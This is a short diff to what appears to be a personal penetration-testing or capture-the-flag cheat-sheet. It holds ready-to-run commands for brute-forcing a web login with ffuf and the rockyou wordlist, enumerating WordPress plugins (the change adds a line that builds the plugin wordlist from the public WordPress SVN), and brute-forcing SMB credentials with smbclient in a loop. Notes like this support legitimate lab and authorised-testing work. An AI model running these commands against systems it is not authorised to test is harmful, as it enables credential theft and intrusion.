@@ -33,7 +33,8 @@
 	ffuf -X POST -u http://$IP/login.php -d "username=USER&password=PASS&login=" -H "Content-Type: application/x-www-form-urlencoded" -w users:USER -w /usr/share/wordlists/rockyou.txt:PASS -x http://127.0.0.1:8080 -fr 'Wrong username' -ac
 
 	# WordPress plugins ( I failed to use wpscan )
-	ffuf -u http://$IP/wp-content/plugins/FUZZ -w /usr/share/wordlists/wordpress-plugins.txt -c
+	curl http://plugins.svn.wordpress.org/ -s | perl -lne 'print $1 if /href="(.+?)\/"/' | grep -vE '^http://' > wordpress-plugins.txt
+	ffuf -u http://$IP/wp-content/plugins/FUZZ -w wordpress-plugins.txt -c
 	
 	# SMB brute force ( hydra did not work )
 	for user in $(cat usernames); do for pass in $(cat passwords); do smbclient -L $IP -U "$user%$pass"; done; done
